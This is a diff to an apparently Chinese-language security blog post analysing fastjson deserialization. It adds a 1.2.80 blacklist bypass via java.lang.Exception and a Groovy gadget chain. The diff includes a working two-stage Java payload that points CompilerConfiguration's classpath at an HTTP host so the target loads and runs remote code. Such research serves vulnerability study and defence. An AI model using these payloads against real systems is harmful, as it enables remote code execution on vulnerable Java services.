@@ -1,7 +1,7 @@
 ---
 layout: post
 date: 2025-8-8
-title: "fastjson(1.2.68)反序列化-分析-利用"
+title: "fastjson(1.2.68-1.2.80)反序列化-分析-利用"
 author: "XinYiSleep"
 category: Java
 ---
@@ -205,4 +205,45 @@ JSON.parseObject(payload1);
 ```java
 。。。。。
 ```
+
+<h1 id="D5RPP">4.1.2.80浅析-利用</h1>
+
+```
+这里是针对1.2.68绕过，其中1.2.80中把`java.lang.Runnable`，`java.lang.Readable` 和 `java.lang.AutoCloseable`写入到了黑名单，
+也就是1.2.68通过java.lang.AutoCloseable绕过的但是现在已经不行了，不过我在上面1.2.68上面一嘴java.lang.Exception，
+也是可以绕过获取新的反序列化器的图一。
+```
+![](https://xinyisleep.github.io/img/2025/fastjson/fastjson1.2.80/1.png)
+
+
+
+<h3 id="ujpBR">4.1 groovy 链</h3>
+```
+这个利用链需要执行两次，第一次使用1.2.68上面分析的需要先Put到缓存中，org.codehaus.groovy.control.CompilationFailedException，
+这里要讲的是CompilationFailedException类构造方法第二个参数类型是ProcessingUnit这个类导致这个类也put到了缓存中图一，
+org.codehaus.groovy.tools.javac.JavaStubCompilationUnit这个类是org.codehaus.groovy.control.ProcessingUnit的子类所以也可以绕过的，
+接着就是JavaStubCompilationUnit类的构造方法config参数类型是org.codehaus.groovy.control.CompilerConfiguration， 最后就是groovy的反序列化链了。
+后面的自己要跟。
+```
+
+```java
+String payload1 = "{\"@type\":\"java.lang.Exception\",\"@type\":\"org.codehaus.groovy.control.CompilationFailedException\",\"unit\":{}}";
+try {
+    JSON.parseObject(payload1);
+} catch (Exception ignored) {
+    String payload2 = "{" +
+            "\"@type\":\"org.codehaus.groovy.control.ProcessingUnit\"," +
+            "\"@type\":\"org.codehaus.groovy.tools.javac.JavaStubCompilationUnit\"," +
+            "\"config\":{" +
+            "  \"@type\":\"org.codehaus.groovy.control.CompilerConfiguration\"," +
+            "  \"classpath\":\"http://127.0.0.1:8081/\"" +
+            "}," +
+            "\"gcl\":null," +
+            "\"destDir\": \"/\"}";
+    JSON.parseObject(payload2);
+}
+}
+```
+
+![](https://xinyisleep.github.io/img/2025/fastjson/fastjson1.2.80/2.png)
 
